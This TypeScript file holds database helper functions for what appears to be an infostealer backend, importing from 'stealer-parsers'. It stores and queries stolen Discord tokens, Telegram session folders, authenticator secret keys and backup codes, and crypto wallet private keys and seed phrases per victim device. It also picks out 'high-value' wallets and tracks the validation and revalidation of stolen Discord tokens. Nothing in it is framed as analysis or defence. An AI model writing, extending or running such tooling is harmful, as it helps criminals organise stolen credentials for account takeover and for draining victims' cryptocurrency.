/**
 * Database Helper Functions for Messaging & Wallet Data
 *
 * Insert and query Discord tokens, Telegram sessions, 2FA data, and crypto wallets
 */

import { executeQuery } from "./mysql"
import { RowDataPacket } from "mysql2"
import type { DiscordToken } from "./stealer-parsers/discord-parser"
import type { TelegramSession } from "./stealer-parsers/telegram-parser"
import type { AuthenticatorData } from "./stealer-parsers/authenticator-parser"
import type { CryptoWallet } from "./stealer-parsers/wallet-parser"

/**
 * Insert Discord tokens into database
 */
export async function insertDiscordTokens(
  deviceId: string,
  tokens: DiscordToken[],
): Promise<number> {
  if (tokens.length === 0) return 0

  const values = tokens.map((token) => [
    deviceId,
    token.token,
    token.token_type,
    token.user_id || null,
    token.username || null,
    token.email || null,
    token.phone || null,
    token.mfa_enabled || null,
    token.verified || null,
    token.file_path,
    token.source_application || null,
  ])

  const query = `
    INSERT INTO discord_tokens (
      device_id, token, token_type, user_id, username, email, phone,
      mfa_enabled, verified, file_path, source_application
    ) VALUES ?
    ON DUPLICATE KEY UPDATE
      user_id = VALUES(user_id),
      username = VALUES(username),
      email = VALUES(email),
      phone = VALUES(phone),
      mfa_enabled = VALUES(mfa_enabled),
      verified = VALUES(verified)
  `

  await executeQuery(query, [values])
  return tokens.length
}

/**
 * Insert Telegram sessions into database
 */
export async function insertTelegramSessions(
  deviceId: string,
  sessions: TelegramSession[],
): Promise<number> {
  if (sessions.length === 0) return 0

  const values = sessions.map((session) => [
    deviceId,
    session.tdata_path,
    session.has_key_data,
    session.has_user_data,
    session.has_map_files,
    session.session_type,
    session.file_count,
    session.total_size,
    session.original_path,
    null, // phone_number - will be populated later if we parse it
    null, // username - will be populated later if we parse it
    null, // user_id - will be populated later if we parse it
  ])

  const query = `
    INSERT INTO telegram_sessions (
      device_id, tdata_path, has_key_data, has_user_data, has_map_files,
      session_type, file_count, total_size, original_path,
      phone_number, username, user_id
    ) VALUES ?
  `

  await executeQuery(query, [values])
  return sessions.length
}

/**
 * Insert 2FA/Authenticator data into database
 */
export async function insertAuthenticatorData(
  deviceId: string,
  authData: AuthenticatorData[],
): Promise<number> {
  if (authData.length === 0) return 0

  const values = authData.map((auth) => [
    deviceId,
    auth.app_type,
    auth.service_name || null,
    auth.account_name || null,
    auth.secret_key || null,
    auth.backup_codes ? JSON.stringify(auth.backup_codes) : null,
    auth.qr_code_path || null,
    auth.file_path,
  ])

  const query = `
    INSERT INTO authenticator_data (
      device_id, app_type, service_name, account_name, secret_key,
      backup_codes, qr_code_path, file_path
    ) VALUES ?
  `

  await executeQuery(query, [values])
  return authData.length
}

/**
 * Insert crypto wallets into database with enhanced fields
 */
export async function insertCryptoWallets(
  deviceId: string,
  wallets: CryptoWallet[],
): Promise<number> {
  if (wallets.length === 0) return 0

  const values = wallets.map((wallet) => [
    deviceId,
    wallet.wallet_type,
    wallet.wallet_name,
    wallet.address || null,
    wallet.private_key || null,
    wallet.seed_phrase || null,
    wallet.mnemonic || null,
    wallet.keystore_file || null,
    wallet.password_hint || null,
    wallet.file_path,
    wallet.blockchain || null,
    // Enhanced fields from LevelDB parsing
    wallet.public_key || null,
    wallet.account_name || null,
    wallet.network_config ? JSON.stringify(wallet.network_config) : null,
    wallet.vault_data ? (typeof wallet.vault_data === 'string' ? wallet.vault_data : JSON.stringify(wallet.vault_data)) : null,
    wallet.extension_id || null,
    // HD Wallet fields
    wallet.derivation_path || null,
    wallet.seed_id || null,
    wallet.address_index || null,
    wallet.wallet_software || null,
    // Ledger Live fields
    wallet.ledger_device_model || null,
    wallet.ledger_balance_usd || null,
    wallet.ledger_operations_count || null,
  ])

  const query = `
    INSERT INTO crypto_wallets (
      device_id, wallet_type, wallet_name, address, private_key,
      seed_phrase, mnemonic, keystore_file, password_hint,
      file_path, blockchain, public_key, account_name, network_config,
      vault_data, extension_id, derivation_path, seed_id, address_index,
      wallet_software, ledger_device_model, ledger_balance_usd, ledger_operations_count
    ) VALUES ?
  `

  await executeQuery(query, [values])
  console.log(`✅ Inserted ${wallets.length} crypto wallet(s) with enhanced fields and HD wallet analysis`)
  return wallets.length
}

/**
 * Get Discord tokens by device ID
 */
export async function getDiscordTokensByDevice(deviceId: string): Promise<DiscordToken[]> {
  const query = `
    SELECT * FROM discord_tokens
    WHERE device_id = ?
    ORDER BY created_at DESC
  `

  const rows = (await executeQuery(query, [deviceId])) as RowDataPacket[]
  return rows.map((row) => ({
    token: row.token,
    token_type: row.token_type,
    user_id: row.user_id,
    username: row.username,
    email: row.email,
    phone: row.phone,
    mfa_enabled: row.mfa_enabled,
    verified: row.verified,
    file_path: row.file_path,
    source_application: row.source_application,
  }))
}

/**
 * Get Telegram sessions by device ID
 */
export async function getTelegramSessionsByDevice(deviceId: string): Promise<TelegramSession[]> {
  const query = `
    SELECT * FROM telegram_sessions
    WHERE device_id = ?
    ORDER BY created_at DESC
  `

  const rows = (await executeQuery(query, [deviceId])) as RowDataPacket[]
  return rows.map((row) => ({
    tdata_path: row.tdata_path,
    has_key_data: row.has_key_data,
    has_user_data: row.has_user_data,
    has_map_files: row.has_map_files,
    session_type: row.session_type,
    session_files: [], // Not stored in DB
    file_count: row.file_count,
    total_size: row.total_size,
    original_path: row.original_path,
  }))
}

/**
 * Get crypto wallets by device ID
 */
export async function getCryptoWalletsByDevice(deviceId: string): Promise<CryptoWallet[]> {
  const query = `
    SELECT * FROM crypto_wallets
    WHERE device_id = ?
    ORDER BY created_at DESC
  `

  const rows = (await executeQuery(query, [deviceId])) as RowDataPacket[]
  return rows.map((row) => ({
    wallet_type: row.wallet_type,
    wallet_name: row.wallet_name,
    address: row.address,
    private_key: row.private_key,
    seed_phrase: row.seed_phrase,
    mnemonic: row.mnemonic,
    keystore_file: row.keystore_file,
    password_hint: row.password_hint,
    file_path: row.file_path,
    blockchain: row.blockchain,
  }))
}

/**
 * Get authenticator data by device ID
 */
export async function getAuthenticatorDataByDevice(
  deviceId: string,
): Promise<AuthenticatorData[]> {
  const query = `
    SELECT * FROM authenticator_data
    WHERE device_id = ?
    ORDER BY created_at DESC
  `

  const rows = (await executeQuery(query, [deviceId])) as RowDataPacket[]
  return rows.map((row) => ({
    app_type: row.app_type,
    service_name: row.service_name,
    account_name: row.account_name,
    secret_key: row.secret_key,
    backup_codes: row.backup_codes ? JSON.parse(row.backup_codes) : undefined,
    qr_code_path: row.qr_code_path,
    file_path: row.file_path,
  }))
}

/**
 * Get counts for all messaging/wallet data
 */
export async function getMessagingWalletCounts(deviceId: string): Promise<{
  discord_tokens: number
  telegram_sessions: number
  authenticator_data: number
  crypto_wallets: number
}> {
  const queries = [
    `SELECT COUNT(*) as count FROM discord_tokens WHERE device_id = ?`,
    `SELECT COUNT(*) as count FROM telegram_sessions WHERE device_id = ?`,
    `SELECT COUNT(*) as count FROM authenticator_data WHERE device_id = ?`,
    `SELECT COUNT(*) as count FROM crypto_wallets WHERE device_id = ?`,
  ]

  const [discordRows, telegramRows, authRows, walletRows] = await Promise.all(
    queries.map((q) => executeQuery(q, [deviceId]) as Promise<RowDataPacket[]>),
  )

  return {
    discord_tokens: discordRows[0]?.count || 0,
    telegram_sessions: telegramRows[0]?.count || 0,
    authenticator_data: authRows[0]?.count || 0,
    crypto_wallets: walletRows[0]?.count || 0,
  }
}

/**
 * Search crypto wallets with filters
 */
export async function searchCryptoWallets(filters: {
  deviceId?: string
  walletType?: string
  walletName?: string
  blockchain?: string
  hasSeedPhrase?: boolean
  hasPrivateKey?: boolean
}): Promise<CryptoWallet[]> {
  let query = `SELECT * FROM crypto_wallets WHERE 1=1`
  const params: any[] = []

  if (filters.deviceId) {
    query += ` AND device_id = ?`
    params.push(filters.deviceId)
  }

  if (filters.walletType) {
    query += ` AND wallet_type = ?`
    params.push(filters.walletType)
  }

  if (filters.walletName) {
    query += ` AND wallet_name LIKE ?`
    params.push(`%${filters.walletName}%`)
  }

  if (filters.blockchain) {
    query += ` AND blockchain = ?`
    params.push(filters.blockchain)
  }

  if (filters.hasSeedPhrase !== undefined) {
    query += ` AND seed_phrase IS ${filters.hasSeedPhrase ? "NOT" : ""} NULL`
  }

  if (filters.hasPrivateKey !== undefined) {
    query += ` AND private_key IS ${filters.hasPrivateKey ? "NOT" : ""} NULL`
  }

  query += ` ORDER BY created_at DESC`

  const rows = (await executeQuery(query, params)) as RowDataPacket[]
  return rows.map((row) => ({
    wallet_type: row.wallet_type,
    wallet_name: row.wallet_name,
    address: row.address,
    private_key: row.private_key,
    seed_phrase: row.seed_phrase,
    mnemonic: row.mnemonic,
    keystore_file: row.keystore_file,
    password_hint: row.password_hint,
    file_path: row.file_path,
    blockchain: row.blockchain,
  }))
}

/**
 * Get high-value wallets (with seed phrases or private keys)
 */
export async function getHighValueWallets(deviceId?: string): Promise<CryptoWallet[]> {
  let query = `
    SELECT * FROM crypto_wallets
    WHERE (seed_phrase IS NOT NULL OR private_key IS NOT NULL)
  `

  const params: any[] = []

  if (deviceId) {
    query += ` AND device_id = ?`
    params.push(deviceId)
  }

  query += ` ORDER BY created_at DESC`

  const rows = (await executeQuery(query, params)) as RowDataPacket[]
  return rows.map((row) => ({
    wallet_type: row.wallet_type,
    wallet_name: row.wallet_name,
    address: row.address,
    private_key: row.private_key,
    seed_phrase: row.seed_phrase,
    mnemonic: row.mnemonic,
    keystore_file: row.keystore_file,
    password_hint: row.password_hint,
    file_path: row.file_path,
    blockchain: row.blockchain,
  }))
}

/**
 * Update Discord token with validation results
 */
export async function updateDiscordTokenValidation(
  deviceId: string,
  token: string,
  validationResult: {
    is_valid: boolean
    username?: string
    discriminator?: string
    global_name?: string | null
    avatar?: string | null
    email?: string | null
    phone?: string | null
    email_verified?: boolean
    phone_verified?: boolean | null
    mfa_enabled?: boolean
    premium_type?: number
    account_flags?: number
    server_count?: number
    friend_count?: number
    account_created?: number
    bio?: string | null
    validation_error?: string | null
  },
): Promise<void> {
  const query = `
    UPDATE discord_tokens
    SET
      is_valid = ?,
      is_validated = TRUE,
      validation_error = ?,
      username = COALESCE(?, username),
      discriminator = ?,
      global_name = ?,
      avatar = ?,
      email = COALESCE(?, email),
      phone = COALESCE(?, phone),
      email_verified = ?,
      phone_verified = ?,
      mfa_enabled = COALESCE(?, mfa_enabled),
      premium_type = ?,
      account_flags = ?,
      server_count = ?,
      friend_count = ?,
      account_created = FROM_UNIXTIME(? / 1000),
      bio = ?,
      last_validated = CURRENT_TIMESTAMP
    WHERE device_id = ? AND token = ?
  `

  await executeQuery(query, [
    validationResult.is_valid,
    validationResult.validation_error || null,
    validationResult.username || null,
    validationResult.discriminator || null,
    validationResult.global_name || null,
    validationResult.avatar || null,
    validationResult.email || null,
    validationResult.phone || null,
    validationResult.email_verified || null,
    validationResult.phone_verified || null,
    validationResult.mfa_enabled || null,
    validationResult.premium_type || null,
    validationResult.account_flags || null,
    validationResult.server_count || null,
    validationResult.friend_count || null,
    validationResult.account_created || null,
    validationResult.bio || null,
    deviceId,
    token,
  ])
}

/**
 * Get unvalidated Discord tokens
 */
export async function getUnvalidatedDiscordTokens(limit: number = 100): Promise<
  Array<{
    id: number
    device_id: string
    token: string
    token_type: string
  }>
> {
  const query = `
    SELECT id, device_id, token, token_type
    FROM discord_tokens
    WHERE is_validated = FALSE OR is_validated IS NULL
    ORDER BY created_at DESC
    LIMIT ?
  `

  const rows = (await executeQuery(query, [limit])) as RowDataPacket[]
  return rows.map((row) => ({
    id: row.id,
    device_id: row.device_id,
    token: row.token,
    token_type: row.token_type,
  }))
}

/**
 * Get Discord tokens that need revalidation (older than X days)
 */
export async function getDiscordTokensForRevalidation(
  daysOld: number = 7,
  limit: number = 100,
): Promise<
  Array<{
    id: number
    device_id: string
    token: string
    token_type: string
    last_validated: Date | null
  }>
> {
  const query = `
    SELECT id, device_id, token, token_type, last_validated
    FROM discord_tokens
    WHERE is_validated = TRUE
      AND (
        last_validated IS NULL
        OR last_validated < DATE_SUB(NOW(), INTERVAL ? DAY)
      )
    ORDER BY last_validated ASC NULLS FIRST
    LIMIT ?
  `

  const rows = (await executeQuery(query, [daysOld, limit])) as RowDataPacket[]
  return rows.map((row) => ({
    id: row.id,
    device_id: row.device_id,
    token: row.token,
    token_type: row.token_type,
    last_validated: row.last_validated,
  }))
}

/**
 * Get validation statistics
 */
export async function getDiscordValidationStats(): Promise<{
  total_tokens: number
  validated_tokens: number
  valid_tokens: number
  invalid_tokens: number
  unvalidated_tokens: number
  nitro_tokens: number
  tokens_with_servers: number
}> {
  const queries = [
    "SELECT COUNT(*) as count FROM discord_tokens",
    "SELECT COUNT(*) as count FROM discord_tokens WHERE is_validated = TRUE",
    "SELECT COUNT(*) as count FROM discord_tokens WHERE is_valid = TRUE",
    "SELECT COUNT(*) as count FROM discord_tokens WHERE is_valid = FALSE",
    "SELECT COUNT(*) as count FROM discord_tokens WHERE is_validated = FALSE OR is_validated IS NULL",
    "SELECT COUNT(*) as count FROM discord_tokens WHERE premium_type > 0",
    "SELECT COUNT(*) as count FROM discord_tokens WHERE server_count > 0",
  ]

  const [
    totalRows,
    validatedRows,
    validRows,
    invalidRows,
    unvalidatedRows,
    nitroRows,
    serversRows,
  ] = await Promise.all(
    queries.map((q) => executeQuery(q, []) as Promise<RowDataPacket[]>),
  )

  return {
    total_tokens: totalRows[0]?.count || 0,
    validated_tokens: validatedRows[0]?.count || 0,
    valid_tokens: validRows[0]?.count || 0,
    invalid_tokens: invalidRows[0]?.count || 0,
    unvalidated_tokens: unvalidatedRows[0]?.count || 0,
    nitro_tokens: nitroRows[0]?.count || 0,
    tokens_with_servers: serversRows[0]?.count || 0,
  }
}
